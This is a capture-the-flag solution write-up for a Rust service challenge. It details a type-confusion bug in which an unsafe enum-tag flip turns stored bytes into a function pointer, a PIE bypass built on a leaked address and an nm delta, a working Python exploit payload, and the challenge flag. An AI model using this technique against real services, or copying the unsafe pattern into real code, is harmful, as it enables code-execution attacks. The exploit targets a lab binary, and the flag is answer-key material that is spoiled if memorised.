## Solution

**TL;DR** — the stack overflow is gone (heap `Vec`, fixed 64-byte
buffer, hex wire format). The new bug is type confusion: `promote`
flips the `Label` enum discriminant from `Text` to `Callback` through
a raw pointer, so your 64 stored bytes are reinterpreted as a function
pointer. `info` leaks `denied` (PIE — derive `print_flag` via the
`nm` delta), rustc reads the confused fn from label offset 7, payload:
`store hex(P*7 + p64)`, `promote 0`, `run 0`.

### 1. Recon — the v1 exploit is dead twice over

```
$ nc <host> 1339
ordinary engineering — vault-svc v2 (memory-safe rewrite)
labels with an automation tier. store one, promote it, run it.
commands: store <hex> | promote <id> | run <id> | show <id> | info | quit
ready.
```

New commands (`promote`, `run <id>`), hex-encoded labels, heap
storage. Nothing overflows anymore. The source (`vault.rs`, in the
handout) is where the audit should concentrate — specifically the one
`unsafe` block:

```rust
fn promote_label(labels: &mut Vec<Label>, idx: usize) {
    unsafe {
        let tag = labels.as_mut_ptr().add(idx) as *mut u8;
        *tag = 1;   // Text = 0, Callback = 1: flip the tag in place
    }
}
```

The comment claims safety from the bounds check — and the *index* is
indeed in bounds. What the check cannot protect is the *invariant*:
after the flip, the 64 bytes you stored as text are read as a
`fn()` by `run_label`'s `match`. Safe Rust could never confuse an
enum like this; the `unsafe` tag write breaks the type from the
outside. That is the whole vulnerability.

### 2. The layout — label offset 7

```rust
#[repr(u8)]
enum Label { Text([u8; 64]), Callback(fn()) }
```

`#[repr(u8)]` fixes the tag values but not where rustc puts the
fields: it packs each variant's payload by its own alignment. A
20-line local harness settles it empirically — store marker windows,
flip the tag, print the confused fn:

```
window at text offset 0 -> fn takes bytes[8..16]      (shifted)
window at text offset 7 -> fn takes bytes[7..15]      (verbatim)
```

So `Text`'s bytes start at struct+1 while `Callback`'s pointer is
read from struct+8: **the address goes at label offset 7**. (The
`info` line confirms `size=72`.) The harness, not the reference
manual, is the intended tool — that experiment IS the challenge's
Rust-layout beat.

### 3. The address — one leak, local delta

The binary is PIE and `info` prints exactly one code pointer:

```
info
build=v2.1.0-rust labels=0 denied=0x... size=72 tag_text=0 tag_callback=1
```

Locally, `nm` gives both ends (Rust symbols are length-prefixed, so
no demangler is needed):

```
$ nm vault | grep -E "6denied|10print_flag"
0000000000018190 t _RNv...5vault10print_flag
0000000000018e30 t _RNv...5vault6denied
```

`delta = print_flag − denied` (here `−0xCA0`; recompute per build —
any source change reshuffles it). Remote target = leaked `denied` +
delta. Same page, same segment, so the delta survives ASLR exactly.

### 4. The exploit

```python
payload = b"P"*7 + struct.pack("<Q", denied_remote + delta)
send(b"store " + payload.hex().encode())   # hex wire format: no bad bytes, ever
send(b"promote 0")                          # tag 0 -> 1, bytes reinterpreted
send(b"run 0")                              # -> cyber_quest{...}
```

Deterministic, one connection. `show 0` before promoting prints your
bytes back (handy debugger); after promoting it reads `callback
redacted` — the first visible proof the type actually flipped.
`admin/solve.py` does the whole dance over a socket.

### Flag

```
cyber_quest{saf3_vault_unsafe_b0undary_4d2e90}
```
